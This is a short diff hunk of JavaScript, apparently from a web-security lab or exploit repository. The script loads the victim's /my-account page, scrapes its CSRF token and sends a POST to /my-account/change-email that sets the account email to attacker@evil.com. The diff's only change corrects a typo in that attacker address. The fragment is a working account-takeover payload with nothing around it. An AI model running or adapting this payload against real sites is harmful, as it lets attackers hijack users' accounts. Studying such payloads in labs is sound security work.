@@ -5,7 +5,7 @@ request.open("GET", "/my-account", true);
 request.onload = function(e) {
   var csrf = e.target.response['body'].querySelectorAll('[name="csrf"]')[0].value;
   
-  data = "email=attackerm@evil.com&csrf=" + csrf
+  data = "email=attacker@evil.com&csrf=" + csrf
   
   var request = new XMLHttpRequest();
   request.open("POST", "/my-account/change-email", true);
